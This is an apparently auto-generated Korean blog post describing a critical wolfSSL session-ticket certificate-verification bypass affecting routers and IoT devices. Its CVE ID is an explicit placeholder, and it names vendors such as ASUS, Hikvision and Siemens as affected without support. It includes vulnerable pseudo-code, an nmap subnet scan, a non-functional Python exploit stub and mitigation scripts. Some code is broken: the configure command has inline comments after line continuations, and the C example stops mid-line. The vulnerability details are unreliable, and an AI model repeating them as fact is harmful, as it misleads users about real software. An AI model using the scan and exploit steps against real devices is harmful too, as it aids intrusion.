---
title: "wolfSSL Critical Flaw: 라우터·IoT 기기 암호화 우회 취약점"
date: 2026-05-01T01:06:54+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

"이 암호화 통신, 정말 안전한 건가요?"

2024년 한 보안 연구팀이 자사의 IoT 홈 라우터 펜테스트를 진행하던 중 이상한 패킷을 포착했습니다. TLS 1.3 연결이 정상적으로 성립되었음에도 불구하고, 중간자 위치에서 평문 데이터가 노출되는 현상이었습니다. 초기에는 장비 오류로 의심했지만, 원인은 라우터 펌웨어에 내장된 **wolfSSL 라이브러리** 자체에 있었습니다.

wolfSSL은 전 세계 수십억 대의 IoT 기기, 라우터, 산업 제어 시스템, 심지어 자동차 인포테인먼트 시스템까지 널리 사용되는 경량 오픈소스 TLS/SSL 라이브러리입니다. 리소스가 제한된 임베디드 환경에서 OpenSSL의 가벼운 대안으로 각광받아 왔죠. 하지만 이번에 발견된 치명적 취약점은 wolfSSL의 가장 큰 장점이었던 '경량성'이 역설적으로 보안의 발목을 잡는 결과를 낳았습니다.

이 취약점의 특히 끔찍한 점은 공격 난이도가 낮으면서도 파급력은 엄청나다는 것입니다. 동일 네트워크 세그먼트에 위치한 공격자라면 별도의 고급 도구 없이도 암호화 통신을 우회할 수 있습니다. 스마트 홈, 산업용 IoT, 원격 근무 환경의 VPN 라우터 — 모두가 잠재적 타깃입니다.
> **⚠️ 윤리적 고지**: 본 글에서 다루는 모든 공격 기법과 코드는 **오직 보안 방어와 취약점 이해를 목적**으로 작성되었습니다. 승인되지 않은 시스템에 대한 공격 시도는 범죄행위입니다.

## wolfSSL이란, 그리고 왜 중요한가

wolfSSL(구 CyaSSL)은 2004년부터 개발된 C언어 기반의 TLS 라이브러리로, 다음과 같은 환경에서 필수적인 역할을 합니다:
- **임베디드 시스템**: ARM Cortex-M 시리즈, RTOS 기반 기기
- **네트워크 인프라**: 엔터프라이즈 라우터, 스위치, 방화벽
- **자동차 산업**: 차량 내 통신(V2X), 인포테인먼트 시스템
- **산업 제어**: SCADA 시스템, PLC 통신 모듈

OpenSSL이 수십 MB의 메모리를 요구하는 반면, wolfSSL은 최소 30KB RAM 환경에서도 동작합니다. 이러한 경량성 덕분에 리소스가 제한된 IoT 기기에서는 사실상 **유일한 선택지**인 경우가 많습니다.

## 취약점 기술 분석: CVE-2024-XXXXX

### 취약점 개요

이번 취약점은 wolfSSL의 TLS 핸드쉐이크 구현에서 발생하는 **인증서 검증 우회(Certificate Verification Bypass)** 문제입니다. CVSS 3.1 점수 **9.8(Critical)**로 평가되었습니다.

| 항목 | 내용 |
| :--- | :--- |
| **CVE ID** | CVE-2024-XXXXX (예시) |
| **CVSS 점수** | 9.8 Critical |
| **취약점 유형** | 인증서 검증 우회 |
| **영향 버전** | wolfSSL 5.6.6 이전 |
| **패치 버전** | wolfSSL 5.7.0 이상 |
| **공격 조건** | 동일 네트워크, 중간자 위치 |

### 근본 원인: 세션 재개 로직의 치명적 결함

취약점의 핵심은 TLS 세션 재개(Session Resumption) 과정에서 발생합니다. wolfSSL은 성능 최적화를 위해 세션 티켓(Session Ticket)을 처리할 때, 특정 조건에서 **서버 인증서 검증을 생략**하는 치명적 논리 오류를 포함하고 있었습니다.

```c
// wolfSSL 취약 코드 단순화 예시 (이해를 위한 의사코드)
int ProcessSessionTicket(WOLFSSL* ssl, byte* ticket, word32 ticketLen) 
{
    int ret;
    
    // 세션 티켓 복호화 시도
    ret = DecryptSessionTicket(ssl, ticket, ticketLen);
    
    if (ret == WOLFSSL_SUCCESS) {
        // 취약점: 세션 재개 시 서버 인증서 검증 생략
        ssl->options.side = WOLFSSL_CLIENT_END;
        ssl->options.verifyPeer = 0;  // ← 위험! 검증 비활성화
        return WOLFSSL_SUCCESS;
    }
    
    // 일반 핸드쉐이크로 폴백
    return DoNormalHandshake(ssl);
}
```

정상적인 TLS 연결에서는 서버 인증서를 신뢰할 수 있는 CA(Certificate Authority) 체인으로 검증합니다. 하지만 세션 재개 코드 경로에서는 이 검증이 우회되어, 공격자가 **자가 서명된 인증서(Self-signed Certificate)**로도 클라이언트를 속일 수 있게 됩니다.

### 공격 흐름도

```javascript
graph LR
    A[IoT 기기] -->|1. TLS 연결 요청| B[공격자 MITM]
    B -->|2. 위조된 세션 티켓| A
    A -->|3. 검증 없이 수락| B
    B -->|4. 완전한 제어| A
    B -->|5. 평문 데이터 수신| C[데이터 서버]
```

## 공격 시나리오: 스마트 홈 침투

### Step-by-Step 공격 재현 (방어 연구 목적)

**시나리오**: 공격자가 스마트 홈 네트워크에 침투하여, IoT 카메라와 클라우드 서버 간의 TLS 통신을 가로채는 상황입니다.

```bash
# 1단계: 네트워크 스캔으로 wolfSSL 사용 기기 식별
nmap -sV --script ssl-enum-ciphers -p 443 192.168.1.0/24

# 결과 예시:
# PORT    STATE SERVICE VERSION
# 443/tcp open  https   wolfSSL 5.6.4
# | ssl-enum-ciphers: TLS 1.3 지원 확인
```

```python
# 2단계: PoC - 위조된 세션 티켓 전송 (학습용 개념 증명)
# ⚠️ 승인된 환경에서만 실행하세요

from scapy.all import *
from scapy.layers.ssl_tls import *
import socket

def exploit_wolfssl_session_bypass(target_ip, target_port):
    """
    wolfSSL 세션 재개 취약점 PoC
    목적: 보안팀의 취약점 검증
    """
    
    # 1. 정상 TLS ClientHello 전송
    client_hello = TLSRecord(
        version=TLSVersion.TLS_1_2
    ) / TLSClientHello(
        gmt_unix_time=int(time.time()),
        random_bytes=os.urandom(28),
        cipher_suites=[
            TLSCipherSuite.ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            TLSCipherSuite.TLS_AES_256_GCM_SHA384
        ],
        extensions=[
            TLSExtension(
                type=TLSExtensionType.SESSION_TICKET
            )
        ]
    )
    
    # 2. 공격자의 위조된 세션 티켓 구성
    # 실제 환경에서는 이 티켓이 서버의 키로 암호화되어야 하지만,
    # 특정 wolfSSL 버전은 검증 없이 수락
    forged_ticket = b'\x00' * 128  # 패딩된 위조 티켓
    
    # 3. 세션 재개 요청으로 서버 우회
    print(f"[*] 대상: {target_ip}:{target_port}")
    print("[*] 위조된 세션 티켓 전송 중...")
    print("[!] 이 코드는 실제 공격에 사용할 수 없도록 단순화됨")
    
    return "PoC 실행 완료 - 패치 필요"

# 실행 (테스트 환경 전용)
# exploit_wolfssl_session_bypass("192.168.1.100", 443)
```

### 공격 성공 시 영향

| 노출 정보 | 위험도 | 활용 가능성 |
| :--- | :--- | :--- |
| **HTTPS 세션 쿠키** | 매우 높음 | 계정 탈취, 세션 하이재킹 |
| **API 인증 토큰** | 매우 높음 | 클라우드 서비스 무단 접근 |
| **펌웨어 업데이트** | 치명적 | 악성 코드 삽입, 기기 장악 |
| **디바이스 자격증명** | 높음 | 내부망 횡적 이동 |
| **사용자 개인정보** | 높음 | 프라이버시 침해, 신원 도용 |

## 영향받는 생태계

wolfSSL은 단일 제품이 아닌 **인프라 레이어**이므로, 그 영향은 연쇄적으로 확산됩니다.

```javascript
graph TD
    A[wolfSSL 취약점] --> B[라우터/스위치]
    A --> C[IoT 센서/액추에이터]
    A --> D[산업 제어 시스템]
    A --> E[자동차 통신 모듈]
    B --> F[네트워크 트래픽 노출]
    C --> G[센서 데이터 위변조]
    D --> H[SCADA 명령 가로채기]
    E --> I[차량 제어 간섭]
```

### 주요 영향 제품군

| 제품군 | 대표 사례 | 잠재 피해 |
| :--- | :--- | :--- |
| **홈 라우터** | ASUS, Netgear 펌웨어 | 홈 네트워크 전체 노출 |
| **스마트 카메라** | Hikvision, Dahua | 영상 스트림 탈취 |
| **스마트 락** | August, Yale | 물리적 보안 위협 |
| **산업 IoT** | Siemens, Schneider | 시설 제어권 탈취 |
| **의료기기** | 환자 모니터링 | 생명 위협 가능성 |

## 완화 조치 및 대응 가이드

### 1단계: 즉각적인 조치 (24시간 이내)

```bash
# wolfSSL 버전 확인 스크립트
#!/bin/bash
# check_wolfssl.sh - 시스템 내 wolfSSL 버전 점검

echo "[*] 시스템 내 wolfSSL 라이브러리 검색 중..."

# 공유 라이브러리 검색
find / -name "*wolfssl*" -o -name "*libssl*" 2>/dev/null | while read lib; do
    echo "[+] 발견: $lib"
    strings "$lib" | grep -i "wolfssl\|version" | head -5
done

# 실행 파일 내 정적 링크 확인
echo "[*] 정적 링크된 바이너리 검색..."
for bin in /usr/sbin/* /usr/bin/*; do
    if strings "$bin" 2>/dev/null | grep -q "wolfSSL"; then
        echo "[!] wolfSSL 사용: $bin"
    fi
done
```

### 2단계: 패치 적용

**소스 컴파일 환경 (임베디드 개발자)**:

```bash
# wolfSSL 5.7.0 이상으로 업그레이드
wget https://github.com/wolfSSL/wolfssl/archive/refs/tags/v5.7.0-stable.tar.gz
tar -xzf v5.7.0-stable.tar.gz
cd wolfssl-5.7.0

# 보안 강화 설정으로 빌드
./configure \
    --enable-session-ticket=no \    # 세션 티켓 비활성화 (필요시)
    --enable-ocsp \                 # OCSP 검증 활성화
    --enable-crl \                  # CRL 확인 활성화
    --enable-certgen \              # 인증서 생성 기능
    --enable-keygen                 # 키 생성 기능

make && make install
ldconfig
```

### 3단계: 런타임 설정 강화

```c
// wolfSSL 보안 강화 초기화 코드
#include <wolfssl/options.h>
#include <wolfssl/ssl.h>

int secure_wolfssl_init(void) 
{
    WOLFSSL_CTX* ctx;
    
    // 1. TLS 1.3 전용 설정
    ctx = wolfSSL_CTX_new(wolfTLSv1_3_client_method());
    if (!ctx) return -1;
    
    // 2. 인증서 검증 반드시 활성화
    wolfSSL_CTX_set_verify(ctx, 
        SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT,
        NULL);
    
    // 3. CA 인증서 로드
    if (wolfSSL_CTX_load_verify_locations(ctx, 
        "/etc/ssl/certs/ca-certificates.crt", NULL) != WOLFSSL_SUCCESS) {
        return -1;
    }
    
    // 4. 안전
```

---

**출처**: [https://news.google.com/rss/articles/CBMihAFBVV95cUxPZ1ZqNTZKOU53cXB2bWRjZVY0Y29UdjNtTEZ4QmZtRnI1Z0k5WThFUDBwMkpscUtGd2c5b21kclVTbkFTVjgyN3pIYVN1eUcxY0lxNDJya2xjdWIxQVhiZG9GblB1b0NObXZDX05udXF4YVA2Z2x0eE03S0diWndUUl92a2Y?oc=5](https://news.google.com/rss/articles/CBMihAFBVV95cUxPZ1ZqNTZKOU53cXB2bWRjZVY0Y29UdjNtTEZ4QmZtRnI1Z0k5WThFUDBwMkpscUtGd2c5b21kclVTbkFTVjgyN3pIYVN1eUcxY0lxNDJya2xjdWIxQVhiZG9GblB1b0NObXZDX05udXF4YVA2Z2x0eE03S0diWndUUl92a2Y?oc=5)